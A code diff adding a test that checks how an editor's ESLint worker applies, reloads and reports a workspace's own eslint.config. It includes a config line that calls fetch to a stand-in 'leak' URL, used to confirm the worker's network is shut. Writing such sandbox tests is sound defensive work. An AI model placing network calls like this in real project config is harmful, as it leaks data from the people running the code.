@@ -317,6 +317,66 @@ test("eslint: real ESLint in its worker — a type-aware problem reported, and f
 	}
 });
 
+// ESLint lints with the workspace's own eslint.config, as on a desktop — the repository's code, run in the worker: its
+// rules over the preset's, loaded afresh as it changes; one that can't load is a problem on it, and the preset lints; and
+// it can't reach out.
+test("eslint: the workspace's own eslint.config — its rules, reloaded as it changes; one that can't load says so; no network", async () => {
+	const workbench = session.workbench();
+	const write = (path, text) => workbench.evaluate(async ([file, contents]) => {
+		const { api } = globalThis.__editor;
+
+		await api.workspace.fs.writeFile(api.Uri.file(file), new TextEncoder().encode(contents));
+	}, [path, text]);
+	const codes = (path) => workbench.evaluate((file) => {
+		const { api } = globalThis.__editor;
+
+		return api.languages.getDiagnostics(api.Uri.file(file)).filter((diagnostic) => diagnostic.source === "eslint").map((diagnostic) => [diagnostic.code ?? "", diagnostic.message]);
+	}, path);
+
+	await write("/workspace/src/config-probe.ts", "export function run(): void {\n\tvar count = 1;\n\tconsole.log(count);\n}\n");
+	await write("/workspace/eslint.config.js", "import config from \"@brianjenkins94/util/eslint\";\n\nexport default [...config, { \"rules\": { \"no-var\": \"off\", \"no-console\": \"error\" } }];\n");
+	await workbench.evaluate(() => globalThis.__editor.api.window.showTextDocument(globalThis.__editor.api.Uri.file("/workspace/src/config-probe.ts")));
+
+	try {
+		const own = await eventually("the workspace config's rules", async () => {
+			const found = (await codes("/workspace/src/config-probe.ts")).map(([code]) => code);
+
+			return found.includes("no-console") ? found : undefined;
+		}, 120_000);
+
+		assert.ok(!own.includes("no-var"), "a rule it turns off is off: " + own.join(", "));
+
+		await write("/workspace/eslint.config.js", "import nope from \"eslint-plugin-nope\";\n\nexport default [nope];\n");
+
+		const said = await eventually("the config's problem", async () => (await codes("/workspace/eslint.config.js")).find(([, message]) => message.includes("couldn't load this config")), 120_000);
+
+		assert.match(said[1], /eslint-plugin-nope/u, "it says why: " + said[1]);
+
+		const preset = await eventually("the preset, meanwhile", async () => {
+			const found = (await codes("/workspace/src/config-probe.ts")).map(([code]) => code);
+
+			return found.includes("no-var") ? found : undefined;
+		}, 120_000);
+
+		assert.ok(!preset.includes("no-console"), "the preset's rules, not the broken config's: " + preset.join(", "));
+
+		// (and the repository's code can't reach out: the worker's network is shut before it runs)
+		await write("/workspace/eslint.config.js", "await fetch(\"https://example.com/?leak\");\n\nexport default [];\n");
+
+		const shut = await eventually("the network refused", async () => (await codes("/workspace/eslint.config.js")).find(([, message]) => message.includes("has no network")), 120_000);
+
+		assert.match(shut[1], /fetch/u, "its fetch was refused: " + shut[1]);
+	} finally {
+		await workbench.evaluate(async () => {
+			const { api } = globalThis.__editor;
+
+			for (const file of ["/workspace/eslint.config.js", "/workspace/src/config-probe.ts"]) {
+				await api.workspace.fs.delete(api.Uri.file(file)).then(() => undefined, () => undefined);
+			}
+		});
+	}
+});
+
 // A program's file calls are the editor's to make (EXTENSION-POINTS.md, 2: the runtime's files, through core) — so a read
 // is what the editor has: an open editor's unsaved text, not what's on disk.
 test("a program's read is the editor's: an open editor's unsaved text", async () => {
